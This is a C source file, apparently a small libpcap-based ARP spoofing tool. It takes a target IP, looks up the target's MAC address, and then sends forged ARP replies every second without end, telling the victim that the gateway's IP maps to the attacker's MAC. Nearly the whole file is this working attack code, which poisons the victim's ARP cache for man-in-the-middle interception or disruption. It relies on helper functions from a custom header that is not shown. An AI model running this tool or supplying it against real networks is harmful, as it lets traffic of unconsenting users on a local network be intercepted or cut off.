#include <netinet/in.h> // for ntohs() function
#include <pcap.h>       // for packet capturing
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // for sleep()
//for structure
#include <netinet/ether.h>
#include <arpa/inet.h>
//custom headerfile
#include "getLocalAddress.h"

void init_pcd(pcap_t **pcd, char **dev);
void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC);

int main(int argc, char **argv)
{
    pcap_t *pcd;
    char *dev;

    struct in_addr      targetIP;
    struct ether_addr   targetMAC; 

    // init
    printf("pcd init ...");
    init_pcd(&pcd, &dev);
    printf("done\n");

    // check input and specify target
    printf("getting target's MAC address ...");
    if(inet_aton(argv[1], &targetIP)==0)
    {
        printf("\nError: invalid IP : %s \n", argv[1]);
        exit(1);
    }
    if(convertIP2MAC(pcd, targetIP, &targetMAC)==-1)
    {
        printf("\nError: given IP(%s) is not in the same network.\n", argv[1]);
        exit(1);
    }
    printf("done.\n");

    // send fake ARP
    printf("start sending fake ARP\n");    
    sendFakeARP(pcd, targetIP, targetMAC, getGatewayIP(), getMyAddr().MAC);

    return 0;
}

void sendFakeARP(pcap_t *pcd, const struct in_addr targetIP, const struct ether_addr targetMAC,
                              const struct in_addr fakeIP,   const struct ether_addr fakeMAC)
{
    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];

    makeARPpacket(packet, fakeIP, fakeMAC, targetIP, targetMAC, ARPOP_REPLY);

    while(1)
    {
        // sending
        if(pcap_inject(pcd, packet, sizeof(packet))==-1)
        {
            pcap_perror(pcd,0);
            pcap_close(pcd);
            exit(1);
        }
        sleep(1);
    }

    return;
}


void init_pcd(pcap_t **pcd, char **dev)
{
    char errbuf[PCAP_ERRBUF_SIZE];

    *dev = pcap_lookupdev(errbuf);

    if(dev == NULL)
    {
        printf("%s\n",errbuf);
        exit(1);
    }
    
    *pcd = pcap_open_live(*dev, BUFSIZ,  0/*NONPROMISCUOUS*/, -1, errbuf);

    if (*pcd == NULL)
    {
        printf("%s\n", errbuf);
        exit(1);
    }

    return;
}
